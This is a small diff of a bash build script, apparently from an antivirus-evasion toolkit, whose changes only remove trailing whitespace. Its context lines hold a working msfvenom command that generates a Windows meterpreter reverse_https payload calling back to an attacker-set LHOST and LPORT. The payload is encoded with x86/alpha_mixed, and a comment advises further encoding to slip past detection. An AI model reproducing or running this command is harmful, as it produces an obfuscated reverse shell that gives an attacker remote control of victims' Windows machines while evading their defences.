@@ -1,4 +1,4 @@
-#!/bin/bash          
+#!/bin/bash
 
 
 #DESCRIPTION_START
@@ -33,7 +33,7 @@ enable_debug_print
 #CONFIGURATION_END
 
 
-# make meterpreter reverse payload, encoded with msf alpha_mixed 
+# make meterpreter reverse payload, encoded with msf alpha_mixed
 # additionaly to the avet encoder, further encoding should be used
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/alpha_mixed -f c -a x86 --platform Windows > input/sc_c.txt
 
